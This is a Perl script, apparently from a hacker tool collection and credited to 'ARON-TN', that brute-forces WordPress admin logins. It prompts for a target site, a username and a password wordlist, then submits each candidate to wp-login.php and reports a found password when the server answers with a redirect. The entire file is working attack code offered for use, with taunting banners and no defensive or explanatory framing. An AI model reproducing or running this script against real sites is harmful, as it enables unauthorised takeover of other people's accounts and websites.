#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Cookies;
use Digest::MD5;
use MIME::Base64;
use LWP::Simple;
use IO::Socket;
use HTTP::Request::Common;
use Term::ANSIColor;

if($^O =~ /Win/){
system("cls");
}else{
system("clear");
}
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
$ua->cookie_jar(
HTTP::Cookies->new(
file => 'cookies.txt',
autosave => 1
)
);

$target = $ARGV[0];
$user = $ARGV[1];
$wordlist = $ARGV[2];
$wpsub = 'wp-submit';
$redirect = 'http://'.$target.'/wp-admin/';
print color("red"),"  Wordpress BruteForce\n";
print color("green"),"                         ^__^\n";
print color("green"),"                         (oo)\_________\n";
print color("green"),"                         (__)\Wordpress)\/\\ \n";
print color("green"),"                             ||-----w |\n";
print color("green"),"                             ||      ||\n";
print color("red"),"       From X4PriV8 V2       ss      ss\n";
print color("green"),"\n ======================================================\n";
print color("red"),"  D3V3L0PP3D BY ARON-TN \n";
print color("green")," =======================================================\n";
chomp $target;

print "[+] Enter Wordpress Site: ";
chomp ($target = <STDIN>);
chomp $user;

print "[+] Enter Wordpress User: ";
chomp ($user = <STDIN>);
chomp $dork;

print "[+] Enter Wordlist: ";
chomp ($wordlist = <STDIN>);
if ($target !~ /^http:\/\//){
print q(
 Wordpress Bruteforce
 Contact me at : aron.tn.official@gmail.com
 ARON-TN was here!!
);
$target = 'http://' . $target;
}
if ($target !~ /\/wp-login.php/){
$target = $target . '/wp-login.php';
}
$notpon = "\n[-] 404 wordlist not found!! \n";
open(a,"<$wordlist") or die "$notpon";
print "\nBruteforce info....
\nSite     : $target
\nUsername : $user
\nWordlist : Found!\n
[+] Bruteforce In Action....\n\n";
sleep(2);
while(<a>){
chomp($_);

my $response
= $ua->post($target,
{ log => $user,
pwd => $_,
$wpsub => 'Log in',
redirect_to => $redirect,
testcookie => '1'
});

my $code = $response->code;
print "[?] Testing $_.....\n";
if ($code == 403){
print "\n\n\t[-] Access Forbidden!!\n";
print "\t---==ARON-TN was here==--- \n\n";
exit;
}
if($code == 302){
print "\n\n\t[*] PASSWORD FOUND: $_\n";
print "\t---==ARON-TN==--- \n\n";
exit;
}
print "[-] Failed!!\n";
}
print "[-] Bruteforce failed!!
\n[!] Your wordlist is sucks!!\n";
exit;